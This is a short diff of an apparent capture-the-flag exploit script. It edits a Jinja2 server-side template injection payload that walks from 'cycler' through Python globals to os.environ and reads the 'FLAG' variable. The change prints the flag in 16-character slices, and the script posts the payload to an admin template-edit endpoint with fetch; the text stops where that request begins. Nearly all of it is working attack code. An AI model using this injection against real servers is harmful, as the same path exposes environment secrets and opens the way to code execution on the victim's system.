@@ -1,8 +1,10 @@
 (async () => {
-  const tpl = `<html><body>
-  <div style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all;">
-  {{ cycler.__init__.__globals__.os.environ['FLAG'] }}
-  </div>
+  const tpl = `<html><body style="font-family: monospace; font-size: 14px;">
+  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][0:16] }}</div>
+  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][16:32] }}</div>
+  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][32:48] }}</div>
+  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][48:64] }}</div>
+  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][64:80] }}</div>
   </body></html>`;
 
   await fetch("/admin/templates/1/edit", {
